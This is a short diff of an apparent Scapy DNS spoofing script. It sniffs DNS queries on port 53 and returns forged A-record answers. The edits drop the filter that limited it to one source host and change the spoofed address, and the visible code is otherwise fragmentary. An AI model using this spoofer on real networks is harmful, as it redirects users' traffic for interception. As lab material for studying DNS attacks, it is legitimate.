@@ -8,7 +8,6 @@ ServerIP = "192.168.56.102"
 packet_filter = " and ".join([
     "udp dst port 53",          # Filter UDP port 53
     "udp[10] & 0x80 = 0",       # DNS queries only
-    "src host 192.168.56.101"    # IP source <ip>
     ])
 
 def dns_reply(pkt):
@@ -46,7 +45,7 @@ def dns_reply(pkt):
             rrname=packet[DNS].qd.qname,
             type='A',
             ttl=600,
-            rdata='192.168.56.101')
+            rdata='8.8.8.8')
         )
 
     # Put the full packet together
@@ -57,7 +56,6 @@ def dns_reply(pkt):
 
 
 sniff(prn=dns_reply, filter=packet_filter, store=0, iface = interface, count = 1)
-
 
         
 		
